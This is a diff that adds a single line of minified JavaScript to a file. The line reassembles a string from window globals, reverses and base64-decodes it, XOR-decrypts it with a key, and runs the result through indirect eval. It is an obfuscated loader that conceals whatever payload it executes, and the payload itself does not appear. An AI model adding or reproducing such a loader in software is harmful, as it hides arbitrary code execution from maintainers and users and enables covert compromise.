@@ -1,0 +1,1 @@
+﻿(()=>{const p=window.__ue_ns_p,k=window.__ue_ns_k;if(!p||!k||p.length<3)throw Error('Missing runtime files');const s=p.join('').split('').reverse().join('');const b=atob(s);const a=Uint8Array.from(b,c=>c.charCodeAt(0));for(let i=0;i<a.length;i++)a[i]^=k[i%k.length];(0,eval)(new TextDecoder().decode(a));})();
